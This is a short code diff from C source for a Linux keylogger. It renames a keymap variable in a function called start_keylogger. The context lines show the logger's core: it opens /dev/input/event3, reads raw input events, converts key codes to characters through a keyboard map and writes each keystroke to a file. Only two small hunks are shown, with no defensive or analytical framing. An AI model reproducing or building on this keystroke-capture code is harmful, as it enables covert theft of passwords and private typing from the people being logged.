@@ -20,7 +20,7 @@ char *get_event_file() {
 
 int start_keylogger() {
 	struct input_event ev;
-	char *map = "..1234567890-=..qwertyuiop{}..asdfghjkl;'...zxcvbnm,./";
+	char *m = "..1234567890-=..qwertyuiop{}..asdfghjkl;'...zxcvbnm,./";
 	char *event_filename = get_event_file();
 	int fd = open("/dev/input/event3", O_RDONLY);
 
@@ -48,7 +48,7 @@ int start_keylogger() {
 					fprintf(fp, " ");
 					break;
 				default:
-					fprintf(fp, "%c", map[ev.code]);
+					fprintf(fp, "%c", m[ev.code]);
 		
 			fflush(fp);
 
